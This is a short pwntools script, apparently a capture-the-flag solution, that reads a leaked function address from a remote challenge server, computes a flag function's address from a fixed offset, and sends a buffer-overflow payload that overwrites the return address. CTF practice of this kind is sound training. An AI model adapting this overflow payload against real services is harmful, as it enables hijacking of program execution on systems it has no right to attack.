from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3008)

offset = 0x79

r.recvuntil("is ")
welcome = int(r.recvn(10), 16)
flag_fnc = welcome - offset

payload = ''
payload += "A"*22
payload += p32(flag_fnc)

r.sendline(payload)
print(r.recvuntil('}\n'))
